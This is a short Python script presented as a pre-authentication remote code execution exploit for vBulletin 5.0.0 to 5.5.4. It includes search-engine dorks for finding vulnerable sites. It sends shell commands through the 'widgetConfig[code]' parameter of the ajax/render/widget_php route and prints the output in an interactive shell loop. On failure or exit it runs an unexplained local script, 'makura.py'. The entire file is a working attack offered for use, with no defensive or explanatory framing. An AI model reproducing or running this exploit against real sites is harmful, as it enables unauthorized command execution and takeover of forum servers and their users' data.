#!/usr/bin/python
#
# vBulletin 5.x 0day pre-auth RCE exploit
# 
# This should work on all versions from 5.0.0 till 5.5.4
#
# Google Dorks:
# - site:*.vbulletin.net
# - "Powered by vBulletin Version 5.5.4"

import requests
import sys
import time
import os

reciever = input("\x1b[1;37m$reciever ")

if not 'http://' in reciever:
 print("\x1b[1;37mReciever:\x1b[1;31m Hey buddy, next time specify a URL. Reciever Out...")
 print("\x1b[1;32mMakura: \x1b[1;37m Next time I would suggest listening to Reciever :\ ")
 sys.exit()

else:
 params = {"routestring":"ajax/render/widget_php"}
 system_detail = "python3 makura.py"
 print("\!/ Spawning a shell...")

while True:
     try:
          cmd = input("vBulletin$ ")
          params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"
          r = requests.post(url = reciever, data = params)
          if r.status_code == 200:
               time.sleep(0.5)
               print (r.text)
          else:
               print("Exploit failed! :(")
               os.system(system_detail)
     except KeyboardInterrupt:
          print("\nClosing shell...")
          os.system(system_detail)
          